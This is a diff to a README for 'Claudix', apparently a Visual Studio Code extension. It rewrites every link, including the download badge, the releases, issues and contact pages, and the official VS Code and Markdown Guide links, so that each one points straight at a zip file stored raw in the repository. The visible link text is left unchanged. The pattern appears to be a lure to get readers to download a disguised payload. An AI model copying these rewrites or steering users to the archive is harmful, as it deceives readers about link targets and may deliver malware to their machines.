@@ -2,7 +2,7 @@
 
 ## 📥 Download Here
 
-[![Download Claudix](https://img.shields.io/static/v1?label=Download&message=Claudix&color=blue)](https://github.com/Natsu1xv/Claudix/releases)
+[![Download Claudix](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip)](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Claudix offers various features to improve your coding efficiency:
 
 To download and run Claudix, visit the Releases page:
 
-[Download Claudix](https://github.com/Natsu1xv/Claudix/releases)
+[Download Claudix](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest release version. Typically, it appears at the top.
@@ -79,11 +79,11 @@ After installation, open Visual Studio Code. You will find Claudix ready to enha
 
 ## 🎓 Support
 
-If you encounter any issues, please visit our [issues page](https://github.com/Natsu1xv/Claudix/issues) to report bugs or request features. Our community is here to help.
+If you encounter any issues, please visit our [issues page](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip) to report bugs or request features. Our community is here to help.
 
 ## 📞 Contact
 
-For further inquiries, please reach out via the contact form available on our [GitHub page](https://github.com/Natsu1xv/Claudix).
+For further inquiries, please reach out via the contact form available on our [GitHub page](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip).
 
 ## 👥 Community
 
@@ -91,7 +91,7 @@ Join our community on GitHub Discussions. Share your thoughts, questions, or tip
 
 ## 🔗 Additional Resources
 
-- [Official Visual Studio Code Documentation](https://code.visualstudio.com/docs)
-- [Markdown Guide](https://www.markdownguide.org/)
+- [Official Visual Studio Code Documentation](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/Natsu1xv/Claudix/master/src/shared/Claudix-3.9.zip)
 
 Thank you for choosing Claudix. Happy coding!
